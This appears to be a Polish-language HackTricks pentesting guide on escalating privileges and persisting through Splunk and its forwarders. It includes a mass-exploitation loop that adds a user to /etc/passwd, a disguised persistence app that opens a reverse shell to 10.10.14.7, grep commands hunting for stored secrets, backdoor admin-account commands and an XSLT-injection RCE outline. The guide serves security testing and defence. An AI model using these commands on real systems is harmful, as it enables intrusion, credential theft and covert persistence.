# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Jeśli podczas **enumerating** maszyny **wewnętrznie** lub **zewnętrznie** znajdziesz **uruchomiony Splunk** (zwykle **8000** dla web UI i **8089** dla management API), prawidłowe dane uwierzytelniające można często wykorzystać do **code execution** poprzez instalację aplikacji, scripted inputs lub działania zarządzające.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Jeśli Splunk działa jako **root**, często prowadzi to do natychmiastowego **privilege escalation**.<sup>[[1]](#references)</sup>

Jeśli potrzebujesz tylko informacji o ogólnej powierzchni zdalnego ataku, enumeracji lub ścieżce RCE przez przesyłanie aplikacji, sprawdź:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Jeśli **masz już uprawnienia root** i usługa Splunk nie nasłuchuje wyłącznie na localhost, możesz również wykraść **hashes haseł Splunk**, odzyskać **zaszyfrowane sekrety** lub wdrożyć **malicious app**, aby utrzymać persistence lokalnie lub na wielu forwarderach.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Interesujące pliki lokalne

Po uzyskaniu dostępu do hosta z uruchomionym Splunk lub Splunk Universal Forwarder poniższe ścieżki są zwykle najbardziej interesujące:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Ważne artefakty:

- **`$SPLUNK_HOME/etc/passwd`**: lokalni użytkownicy Splunk i hashe haseł.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: klucz używany przez Splunk do szyfrowania sekretów przechowywanych w kilku plikach `.conf`.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: początkowy plik bootstrapujący administratora; przydatny w gold images i przypadkach błędów provisioningu. Jest ignorowany, jeśli `etc/passwd` już istnieje.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: miejsce, w którym często włącza się scripted inputs.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** lub **`$SPLUNK_HOME/etc/apps/`**: dobre miejsca do ukrycia persistent app lub sprawdzenia, co jest już dystrybuowane.<sup>[[11]](#references)</sup>

## Podsumowanie exploita Splunk Universal Forwarder Agent

Więcej szczegółów można znaleźć na stronie [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). To tylko podsumowanie.<sup>[[1]](#references)</sup>

**Przegląd exploita:**
Exploit wymierzony w Splunk Universal Forwarder (UF) umożliwia attackerom posiadającym **agent password** wykonywanie dowolnego kodu w systemach, na których działa agent, co potencjalnie może doprowadzić do przejęcia dużej części środowiska.<sup>[[1]](#references)</sup>

**Dlaczego działa:**

- Usługa zarządzania UF jest często wystawiona na **TCP 8089**.<sup>[[6]](#references)</sup>
- Attackers mogą uwierzytelnić się do API i nakazać forwarderowi zainstalowanie **malicious app bundle**.<sup>[[1]](#references)[[5]](#references)</sup>
- Ta sama primitive może być użyta lokalnie do **LPE** lub zdalnie do **RCE**.<sup>[[5]](#references)</sup>
- Publiczne narzędzia, takie jak **SplunkWhisperer2**, automatycznie tworzą app bundle i mogą dostosowywać payloads do celów z systemem Linux.<sup>[[5]](#references)</sup>

**Typowe sposoby odzyskania hasła:**

- Dane uwierzytelniające w cleartext w dokumentacji, skryptach, udziałach lub automatyzacji deploymentu.<sup>[[1]](#references)</sup>
- Hashe haseł wewnątrz `$SPLUNK_HOME/etc/passwd`, a następnie offline cracking.<sup>[[1]](#references)[[7]](#references)</sup>
- Golden images lub pozostałości provisioningu, takie jak `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>

**Wpływ:**

- Wykonywanie kodu z uprawnieniami SYSTEM/root na każdym przejętym hoście.<sup>[[1]](#references)</sup>
- Deployment persistent apps, backdoors lub ransomware.<sup>[[1]](#references)</sup>
- Wyłączanie lub manipulowanie telemetry przed przekazaniem danych dalej.<sup>[[1]](#references)</sup>

**Przykładowe polecenie do exploita:**

Oryginalny raport przedstawia następującą pętlę służącą do wysyłania payloadu do wielu forwarderów.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Dostępne publiczne exploity:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

Jeśli masz **dostęp do zapisu w systemie plików** jako `root`/`splunk` lub uwierzytelniony dostęp umożliwiający instalowanie apps, bardzo niezawodnym mechanizmem persistence jest umieszczenie **custom app** zawierającej **scripted input**.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Dokumentacja Splunk zakłada, że scripted inputs znajdują się w katalogu app i są włączane z poziomu `inputs.conf`.<sup>[[10]](#references)</sup>

Typowy układ:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimalny `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Szybki Linux dropper (z użyciem udokumentowanego układu aplikacji):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Uwagi:

- Ta sama sztuczka działa w przypadku **Universal Forwarder** z użyciem `/opt/splunkforwarder/etc/apps/`.<sup>[[2]](#references)[[10]](#references)</sup>
- Atakujący często wtapiają się w środowisko, modyfikując legalny add-on zamiast tworzyć oczywiście złośliwą aplikację.<sup>[[2]](#references)</sup>
- Na **deployment server** umieszczenie złośliwej aplikacji w `deployment-apps/` zmienia się w **fleet-wide persistence**, ponieważ forwarders odpytują serwer, pobierają zaktualizowane aplikacje i często uruchamiają się ponownie, aby je zastosować.<sup>[[11]](#references)[[12]](#references)</sup>

## Kradzież danych uwierzytelniających i przejęcie konta administratora

Jeśli możesz odczytywać lokalne pliki Splunk, zwykle istnieją dwa dobre cele: odzyskanie **dostępu administratora Splunk** oraz odzyskanie **zaszyfrowanych danych uwierzytelniających usług**.<sup>[[8]](#references)</sup>

### Hashes haseł i użytkownicy lokalni

Splunk przechowuje lokalne dane uwierzytelniania w `etc/passwd`. W zależności od wdrożenia złamanie tego pliku może umożliwić odzyskanie działających danych uwierzytelniających do web UI i management API.<sup>[[1]](#references)[[7]](#references)</sup>

Jeśli masz już prawidłowe dane uwierzytelniające **admin**, a Splunk korzysta z **native** backendu uwierzytelniania, sam CLI może zostać użyty do persistence.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` i zaszyfrowane wartości

Splunk używa `etc/auth/splunk.secret` do ochrony poufnych wartości przechowywanych w wielu plikach konfiguracyjnych. Jeśli uda Ci się wykraść zarówno **secret**, jak i odpowiednie pliki **`.conf`**, często możesz odzyskać lub ponownie wykorzystać:<sup>[[8]](#references)</sup>

- współdzielone secrets forwardera/indexera, takie jak `pass4SymmKey`
- hasła kluczy prywatnych TLS, takie jak `sslPassword`
- dane uwierzytelniające LDAP bind, takie jak `bindDNPassword`

Może to umożliwić **lateral movement**, nawet jeśli hasła administratora Splunk nie da się złamać.<sup>[[8]](#references)</sup>

### Nadużywanie `user-seed.conf`

`user-seed.conf` jest używany wyłącznie podczas pierwszego uruchomienia lub gdy `etc/passwd` nie istnieje. Sprawia to, że jest mniej przydatny na działającym hoście, ale bardzo interesujący w przypadku:<sup>[[9]](#references)</sup>

- przejętych szablonów instalacyjnych
- obrazów kontenerów
- procesów automatycznego provisioningu
- appliance'ów, w których Splunk jest automatycznie inicjalizowany ponownie

W takich przypadkach umieszczenie `HASHED_PASSWORD` wygenerowanego za pomocą `splunk hash-passwd` daje cichy sposób na odzyskanie dostępu administratora po ponownym wdrożeniu.<sup>[[9]](#references)</sup>

## Nadużywanie zapytań Splunk

Więcej szczegółów znajdziesz na stronie [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Przydatną nowszą techniką jest nadużywanie **XSLT dostarczanego przez użytkownika** w podatnych wersjach Splunk Enterprise w celu przekształcenia uwierzytelnionego konta o niskich uprawnieniach w możliwość **wykonywania poleceń systemu operacyjnego** jako użytkownik `splunk`.<sup>[[3]](#references)[[4]](#references)</sup>

Przebieg na wysokim poziomie:<sup>[[3]](#references)[[4]](#references)</sup>

1. Uwierzytelnij się w Splunk.
2. Prześlij złośliwy plik **XSL** za pomocą funkcji podglądu/przesyłania.
3. Spraw, aby Splunk renderował wyniki wyszukiwania przy użyciu przesłanego arkusza stylów z katalogu **dispatch**.
4. Użyj payloadu XSLT do zapisania pliku lub wywołania wykonania za pośrednictwem pipeline'u wyszukiwania Splunk, na przykład poprzez dotarcie do wewnętrznej funkcjonalności takiej jak `runshellscript`.

Najważniejszy wniosek ofensywny jest taki, że ta ścieżka zapewnia **post-auth RCE bez potrzeby app upload**. W systemie Linux zwykle uzyskuje się dostęp jako konto **`splunk`**, które nadal jest wartościowe, ponieważ ten użytkownik często jest właścicielem drzewa aplikacji, może odczytywać secrets i umieszczać persistent apps, które przetrwają utratę shella.<sup>[[3]](#references)[[4]](#references)</sup>

Reprezentatywna ścieżka używana podczas exploitation to:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Jeśli Splunk działa ze zbyt dużymi uprawnieniami lub użytkownik `splunk` ma dostęp do niebezpiecznych skryptów, zapisywalnych jednostek usług albo niewłaściwych reguł `sudo`, otrzymujemy czysty łańcuch **LPE**.

## References

- [1] [Nadużywanie Splunk Forwarders do RCE i Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Uważaj na TraitorWare: używanie Splunk do Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Analiza CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Zmiana wartości domyślnych](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Wdrażanie bezpiecznych haseł na wielu serwerach](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Konfigurowanie scripted input](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Tworzenie deployment apps](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Jak przebiegają aktualizacje deployment](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [Konfigurowanie użytkowników za pomocą CLI](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
